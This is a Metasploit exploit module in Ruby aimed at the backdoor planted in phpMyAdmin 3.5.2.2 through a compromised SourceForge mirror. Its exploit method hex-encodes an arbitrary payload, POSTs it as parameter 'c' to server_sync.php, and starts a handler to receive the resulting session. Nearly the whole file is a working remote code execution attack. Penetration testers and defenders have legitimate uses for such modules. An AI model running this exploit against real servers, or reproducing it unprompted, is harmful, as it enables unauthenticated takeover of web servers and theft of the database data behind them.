# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;phpMyAdmin 3.5.2.2 server_sync.php Backdoor&#039;,
      &#039;Description&#039;    => %q{
          This module exploits an arbitrary code execution backdoor 
        placed into phpMyAdmin v3.5.2.2 thorugh a compromised SourceForge mirror.
      },
      &#039;Author&#039;         => [ &#039;hdm&#039; ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Version&#039;        => &#039;$Revision$&#039;,
      &#039;References&#039;     => [ [&#039;URL&#039;, &#039;http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php&#039;] ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;ConnectionType&#039; => &#039;find&#039;,
            },
          # Arbitrary big number. The payload gets sent as an HTTP
          # response body, so really it&#039;s unlimited
          &#039;Space&#039;       => 262144, # 256k
        },
      &#039;DefaultOptions&#039; =>
        {
          &#039;WfsDelay&#039; => 30
        },
      &#039;DisclosureDate&#039; => &#039;Sep 25 2012&#039;,
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
      &#039;DefaultTarget&#039; => 0))

    register_options([
      OptString.new(&#039;PATH&#039;, [ true , "The base directory containing phpMyAdmin try", &#039;/phpMyAdmin&#039;])
    ], self.class)
  end

  def exploit

    uris = []

    tpath = datastore[&#039;PATH&#039;]
    if tpath[-1,1] == &#039;/&#039;
      tpath = tpath.chop
    end

    pdata = "c=" + Rex::Text.to_hex(payload.encoded, "%")

    res = send_request_raw( {
      &#039;global&#039;  => true,
      &#039;uri&#039;     => tpath + "/server_sync.php",
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;data&#039;    => pdata,
      &#039;headers&#039; => {
        &#039;Content-Type&#039;   => &#039;application/x-www-form-urlencoded&#039;,
        &#039;Content-Length&#039; => pdata.length,
      }
    }, 1.0)

    handler
  end
end



